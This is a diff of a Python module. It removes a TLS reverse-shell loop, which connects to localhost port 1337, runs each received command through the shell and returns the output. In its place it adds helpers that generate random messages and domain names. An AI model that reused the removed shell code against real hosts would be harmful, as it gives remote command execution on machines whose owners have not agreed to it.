@@ -45,38 +45,39 @@ under certain conditions.
 __license__ = license
 __copyright__ = copyright
 
-__all__ = []
+__all__ = ["get_random_message", "get_random_domain"]
 
-print(copyright)
+from string import ascii_letters, digits
+from random import randint, choices
 
-from os.path import join
-from socket import socket
-from contextlib import suppress
-from subprocess import run, PIPE
-from ssl import SSLContext, PROTOCOL_TLS_CLIENT
-
-context = SSLContext(PROTOCOL_TLS_CLIENT)
-context.load_verify_locations(join("..", "server.crt"))
+letters: bytes = ascii_letters.encode()
+alphanum: bytes = ascii_letters.encode() + b"_" + digits.encode()
 
 
-def sendall(data):
-    chunk = data[:30000]
-    data = data[30000:]
-    while chunk:
-        ss.sendall(chunk)
-        chunk = data[:30000]
-        data = data[30000:]
+def get_random_message() -> bytes:
+    """
+    This function generates a random message.
+    """
+
+    msg = b""
+    for a in range(randint(2, 8)):
+        msg += bytes(choices(letters, k=randint(1, 10))) + b" "
+    return msg[:-1]
 
 
-data = b" "
-while True:
-    with suppress(Exception):
-        s = socket()
-        ss = context.wrap_socket(s, server_hostname="localhost")
-        ss.connect(("127.0.0.1", 1337))
-        sendall(data)
-        command = ss.recv(65535).decode()
-        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
-        data = p.stdout or p.stderr or b" "
-        ss.close()
-        s.close()
+def get_random_domain(wildcard: bool = False) -> bytes:
+    """
+    This function generates a random domain.
+    """
+
+    return (
+        b"*"
+        if wildcard
+        else bytes(
+            choices(alphanum, k=randint(1, 10))
+        )  # wildcard syntax for subdomain
+        + b"."
+        + bytes(choices(alphanum, k=randint(1, 10)))
+        + b"."
+        + bytes(choices(letters, k=randint(2, 4)))
+    )
